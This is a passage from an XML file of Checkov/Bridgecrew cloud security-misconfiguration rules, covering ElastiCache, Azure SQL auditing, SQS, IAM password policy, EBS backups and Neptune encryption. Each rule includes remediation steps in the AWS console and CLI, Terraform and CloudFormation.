</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::ElastiCache::ReplicationGroup</li>
<li><strong>Argument</strong>: AtRestEncryptionEnabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
    ReplicationGroup:
    Type: 'AWS::ElastiCache::ReplicationGroup'
    Properties:
      ...
+     AtRestEncryptionEnabled: True
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/general_9' target='_blank'> https://docs.bridgecrew.io/docs/general_9</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/general_9' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_31</key>
    <name>Ensure data stored in the ElastiCache Replication Group is securely encrypted in-transit</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="data-stored-in-the-elasticache-replication-group-is-not-securely-encrypted-in-transit"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-data-stored-in-the-elasti-cache-replication-group-is-not-securely-encrypted-in-transit"></div>Data stored in the ElastiCache Replication Group is not securely encrypted in-transit</div><a aria-label="Skip link to Data stored in the ElastiCache Replication Group is not securely encrypted in-transit" class="heading-anchor-icon fa fa-anchor" href="#data-stored-in-the-elasticache-replication-group-is-not-securely-encrypted-in-transit"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In Amazon ElastiCache, the Redis authentication command asks users to enter a password prior to being granted permission to execute Redis commands on a password-protected server. Authentication can only be enabled when you are creating clusters with the in-transit encryption option enabled. When Redis authentication is enabled, users are required to pass through an additional layer of authentication before gaining access to the server and gaining permission to perform actions.<br/>
We recommend that all data stored in the ElastiCache Replication Group is securely encrypted in-transit with an authentication token.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="procedure"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-procedure"></div>Procedure</div><a aria-label="Skip link to Procedure" class="heading-anchor-icon fa fa-anchor" href="#procedure"></a></h2>
<p>To authenticate a user using <strong>Redis AUTH</strong> create a new <strong>Redis Cluster</strong> with the following parameters enabled:</p>
<ul>
<li>transit-encryption-enabled</li>
<li>auth-token.</li>
</ul>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>The following AWS CLI operation modifies a replication group to rotate the AUTH token This-is-the-rotated-token.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws elasticache modify-replication-group \
--replication-group-id authtestgroup \
--auth-token This-is-the-rotated-token \
--auth-token-update-strategy ROTATE \
--apply-immediately
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_elasticache_replication_group</li>
<li><strong>Argument</strong>: auth_token - (Optional) The password used to access a password protected server. Can be specified only if transit_encryption_enabled = true </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_elasticache_replication_group" "example" {
  ...
  at_rest_encryption_enabled    = true
+ auth_token                    = var.auth_token
+ transit_encryption_enabled    = true
  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::ElastiCache::ReplicationGroup</li>
<li><strong>Argument</strong>: AuthToken - (Optional) The password used to access a password protected server. Can be specified only if TransitEncryptionEnabled = true </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
    ReplicationGroup:
    Type: 'AWS::ElastiCache::ReplicationGroup'
    Properties:
        ...
+     AuthToken: 'MySecret!AuthToken$'
+     TransitEncryptionEnabled: True
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/general_11' target='_blank'> https://docs.bridgecrew.io/docs/general_11</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/general_11' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_24</key>
    <name>Ensure Azure SQL server audit log retention is greater than 90 days</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-sql-server-audit-log-retention-is-less-than-91-days"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-sql-server-audit-log-retention-is-less-than-91-days"></div>Azure SQL server audit log retention is less than 91 days</div><a aria-label="Skip link to Azure SQL server audit log retention is less than 91 days" class="heading-anchor-icon fa fa-anchor" href="#azure-sql-server-audit-log-retention-is-less-than-91-days"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Audit Logs can be used to check for anomalies and give insight into suspected breaches or misuse of information and access.</p>
<p>We recommend you configure SQL server audit retention to be greater than 90 days.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.<br/>
2 Navigate to <strong>SQL servers</strong>.</li>
<li>For each server instance:<br/>
a) Click <strong>Auditing</strong>.<br/>
b) Select <strong>Storage Details</strong>.<br/>
c) Set <strong>Retention (days) </strong>to <strong>greater than 90 days</strong>.<br/>
d) Click <strong>OK</strong>.<br/>
e) Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set the retention policy for more than or equal to 90 days, for each server, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">set-AzureRmSqlServerAuditing 
-ResourceGroupName &lt;resource group name&gt; 
-ServerName &lt;server name&gt; 
-RetentionInDays &lt;Number of Days to retain the audit logs, should be 90days minimum&gt;
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_sql_server, azurerm_mssql_server</li>
<li><strong>Argument</strong>: retention_in_days* </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_sql_server" "example" {
    ...
    extended_auditing_policy {
      storage_endpoint            = azurerm_storage_account.example.primary_blob_endpoint
      storage_account_access_key  = azurerm_storage_account.example.primary_access_key
      storage_account_access_key_is_secondary = true
 +       retention_in_days                       = &lt;90 or greater&gt;
    }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_logging_3' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_logging_3</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_logging_3' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_28</key>
    <name>Ensure public facing ALB are protected by AWS Web Application Firewall v2 (AWS WAFv2)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="application-load-balancer-alb-not-configured-with-aws-web-application-firewall-v2-aws-wafv2"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-application-load-balancer-alb-not-configured-with-aws-web-application-firewall-v-2-aws-wa-fv-2"></div>Application Load Balancer (ALB) not configured with AWS Web Application Firewall v2 (AWS WAFv2)</div><a aria-label="Skip link to Application Load Balancer (ALB) not configured with AWS Web Application Firewall v2 (AWS WAFv2)" class="heading-anchor-icon fa fa-anchor" href="#application-load-balancer-alb-not-configured-with-aws-web-application-firewall-v2-aws-wafv2"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-public-facing-alb-are-protected-by-waf' target='_blank'> https://docs.bridgecrew.io/docs/ensure-public-facing-alb-are-protected-by-waf</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-public-facing-alb-are-protected-by-waf' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_37</key>
    <name>Ensure AWS Codecommit is associated with an approval rule</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-codecommit-is-not-associated-with-an-approval-rule"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-codecommit-is-not-associated-with-an-approval-rule"></div>AWS Codecommit is not associated with an approval rule</div><a aria-label="Skip link to AWS Codecommit is not associated with an approval rule" class="heading-anchor-icon fa fa-anchor" href="#aws-codecommit-is-not-associated-with-an-approval-rule"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-codecommit-is-associated-with-an-approval-rule' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-codecommit-is-associated-with-an-approval-rule</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-codecommit-is-associated-with-an-approval-rule' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_10</key>
    <name>Ensure AWS IAM password policy has a minimum of 14 characters</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-iam-password-policy-does-not-have-a-minimum-of-14-characters"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-iam-password-policy-does-not-have-a-minimum-of-14-characters"></div>AWS IAM password policy does not have a minimum of 14 characters</div><a aria-label="Skip link to AWS IAM password policy does not have a minimum of 14 characters" class="heading-anchor-icon fa fa-anchor" href="#aws-iam-password-policy-does-not-have-a-minimum-of-14-characters"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Password policies are used to enforce the creation and use of password complexity. Your IAM password policy should be set for passwords to require the inclusion of different character types. The password policy should enforce passwords contain a minimum of 14 characters, this increases security, especially from a brute force attack.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the password policy in the AWS Console you will need appropriate permissions to View Identity Access Management Account Settings.</p>
<p>To manually set the password policy with a minimum length, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console as an <strong>IAM user</strong> at <a href="https://console.aws.amazon.com/iam/" target="_self">https://console.aws.amazon.com/iam/</a>.</li>
<li>Navigate to <strong>IAM Services</strong>.</li>
<li>On the Left Pane click <strong>Account Settings</strong>.</li>
<li>Set <strong>Minimum password length</strong> to 14 or greater. </li>
<li>Click <strong>Apply password policy</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To change the password policy, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws iam update-account-password-policy --minimum-password-length 14
</code></pre>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>All commands starting with <strong>aws iam update-account-password-policy</strong> can be combined into a single command.</p></blockquote> <br/> <a href='https://docs.bridgecrew.io/docs/iam_9-1' target='_blank'> https://docs.bridgecrew.io/docs/iam_9-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/iam_9-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_27</key>
    <name>Ensure AWS SQS server side encryption is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-sqs-server-side-encryption-is-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-sqs-server-side-encryption-is-not-enabled"></div>AWS SQS server side encryption is not enabled</div><a aria-label="Skip link to AWS SQS server side encryption is not enabled" class="heading-anchor-icon fa fa-anchor" href="#aws-sqs-server-side-encryption-is-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon Simple Queue Service (SQS) provides the ability to encrypt queues so sensitive data is passed securely. It uses server-side-encrypyion (SSE) and supports AWS-managed Customer Master Key (CMK), as well as self-created/self-managed keys. SSE encrypts only the body of the message, with queue metadata and message metadata out of scope, and backlogged messages not encrypted. </p>
<p>If you operate in a regulated market, such as HIPAA for healthcare, PCI DSS for finance, or FedRAMP for government, you need to ensure sensitive data messages passed in this service are encrypted at rest.</p>
<p>We recommend you encrypt Data Queued using SQS.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <strong><a href="https://console.aws.amazon.com/sqs/" target="_self">Amazon SQS console</a></strong>.</li>
<li>Open a Queue and click <strong>Edit</strong> at the top right.</li>
<li>Expand <strong>Encryption</strong> and select <strong>Enabled</strong>.</li>
<li>Select or enter a CMK key, or use the default provided by AWS.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">aws sqs set-queue-attributes --queue-url &lt;QUEUE_URL&gt; --attributes KmsMasterKeyId=&lt;KEY&gt;
</code></pre>
<p>The format of the queue URL is <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">https://sqs.REGION.amazonaws.com/ACCOUNT_ID/QUEUE_NAME</code></p>
<p>The key should be a KMS key or alias. The default AWS key is <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">alias/aws/sqs</code>.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_sqs_queue</li>
<li><strong>Arguments</strong>:<br/>
kms_master_key_id - (Optional) The ID of an AWS-managed customer master key (CMK) for Amazon SQS or a custom CMK.<br/>
kms_data_key_reuse_period_seconds - (Optional) The length of time, in seconds, for which Amazon SQS can reuse a data key to encrypt or decrypt messages before calling AWS KMS again. An integer representing seconds, between 60 seconds (1 minute) and 86,400 seconds (24 hours). The default is 300 (5 minutes).</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_sqs_queue.terraform_queue.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_sqs_queue.terraform_queue.tf">resource "aws_sqs_queue" "example" {
  name                              = "terraform-example-queue"
+ kms_master_key_id                 = "alias/aws/sqs"
+ kms_data_key_reuse_period_seconds = 300
  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::SQS::Queue</li>
<li><strong>Arguments</strong>: Properties.KmsMasterKeyId</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::SQS::Queue
    Properties:
      ...
+     KmsMasterKeyId: "kms_id"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/general_16-encrypt-sqs-queue' target='_blank'> https://docs.bridgecrew.io/docs/general_16-encrypt-sqs-queue</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/general_16-encrypt-sqs-queue' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_9</key>
    <name>Ensure EBS has an AWS Backup backup plan</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="ebs-does-not-have-an-aws-backup-backup-plan"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ebs-does-not-have-an-aws-backup-backup-plan"></div>EBS does not have an AWS Backup backup plan</div><a aria-label="Skip link to EBS does not have an AWS Backup backup plan" class="heading-anchor-icon fa fa-anchor" href="#ebs-does-not-have-an-aws-backup-backup-plan"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_backup_selection, aws_ebs_volume</li>
<li><strong>Argument:</strong> <em>resources</em> and <em>plan_id</em> of aws_backup_selection</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_ebs_volume" "ebs_good" {
  availability_zone = "us-west-2a"
  size              = 40

  tags = {
    Name = "HelloWorld"
  }
}


resource "aws_backup_selection" "backup_good" {
  iam_role_arn = "arn"
  name         = "tf_example_backup_selection"
  plan_id      = "123456"

  resources = [
    aws_ebs_volume.ebs_good.arn
  ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-ebs-are-added-in-the-backup-plans-of-aws-backup' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-ebs-are-added-in-the-backup-plans-of-aws-backup</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-ebs-are-added-in-the-backup-plans-of-aws-backup' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_44</key>
    <name>Ensure Neptune storage is securely encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="neptune-storage-is-not-securely-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-neptune-storage-is-not-securely-encrypted"></div>Neptune storage is not securely encrypted</div><a aria-label="Skip link to Neptune storage is not securely encrypted" class="heading-anchor-icon fa fa-anchor" href="#neptune-storage-is-not-securely-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon Neptune is a fully managed graph database service for building and running applications that work with connected datasets. Neptune supports graph query languages such as Apache TinkerPop Gremlin and W3C&#8217;s SPARQL.  Neptune also supports recommendation engines, fraud detection, knowledge graphs, drug discovery, and network security.</p>
<p>Encryption of Neptune storage protects data and metadata against unauthorized access. It also fulfils compliance requirements for data-at-rest encryption of production file systems. Encryption for an existing database cannot be added or changed after it is created.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <strong><a href="https://console.aws.amazon.com/neptune/" target="_self">Amazon Neptune console</a></strong>.</li>
<li>To start the Launch DB instance wizard, click <strong>Launch DB Instance</strong>. </li>
<li>To customize the settings for your Neptune DB cluster, navigate to the <strong>Specify DB details</strong> page.</li>
